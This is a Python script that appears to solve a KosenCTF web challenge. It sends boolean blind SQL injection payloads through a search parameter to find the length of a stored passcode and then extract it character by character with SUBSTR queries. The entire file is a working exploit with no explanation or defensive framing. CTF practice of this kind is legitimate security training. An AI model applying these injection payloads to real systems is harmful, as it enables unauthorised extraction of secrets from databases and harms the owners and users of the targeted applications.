import requests
from bs4 import BeautifulSoup

def check(sql):
    url = 'http://web.kosenctf.com:11000/'
    response = requests.get(url+"?search="+sql)

    soup = BeautifulSoup(response.text, "html.parser")
    if soup.find("li"):
        return True
    else:
        return False

length = 1

while 1:
    sql = f'secret\') AND name = \'secret_file\' AND LENGTH(passcode) = {length};--'

    if check(sql):
        print(length)
        break
    length += 1

passcode = ''
for index in range(1, length+1):
    for char_number in range(48, 123):
        char = chr(char_number)
        sql = f'secret\') AND name = \'secret_file\' AND SUBSTR(passcode, {index}, 1) = \'{char}\';--'

        if check(sql):
            print(index, char)
            passcode += char
            break
print(passcode)
